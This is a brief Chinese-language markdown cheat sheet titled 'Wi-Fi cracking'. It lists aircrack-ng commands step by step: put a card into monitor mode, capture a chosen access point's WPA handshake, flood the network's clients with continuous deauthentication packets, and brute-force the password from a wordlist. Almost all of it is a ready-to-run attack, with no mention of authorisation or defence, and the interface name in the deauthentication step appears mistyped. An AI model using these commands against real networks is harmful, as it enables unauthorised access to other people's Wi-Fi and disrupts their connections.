# wifi破解

* 洪水攻击

   ```bash
   aireplay-ng -0 0 -a mac_addr wlan9mon
   ```


## 逐步详解：

1. 先尝试打开无线监听模式：

```bash
airmon-ng start wlan0
```

2. 按照提示，先检查关闭网卡

```bash
airmon-ng check kill
```

3. 重复动作1，然后开启监听模式

```bash
ifconfig
iwconfig -a
```

4. 开始监听附近的无线网络

```bash
airodump-ng wlan0mon
```

5. 记录下需要破解的Wi-Fi BSSID，以及所处在的信道
6. 开始抓包，抓主wifi的握手包

```bash
airodump-ng -c 9 --bssid B4:0F:3B:34:1F:01 -w /root/Desktop/wifiCracker wlan0mon
# 其中:
#-c 为所在信道
#-bssid 为目标ap的mac地址
```

7. 此时如果不想等待，可以对ap进行攻击，使用命令：

```bash
aireplay-ng -0 0 -a mac_addr wlan9mon
```

8. 再完成抓包后，使用命令进行破解：

```bash
aircrack-ng -w top10W.txt -b F4:83:CD:CD:9F:7A /root/Desktop/wifiCracker/*.cap
```

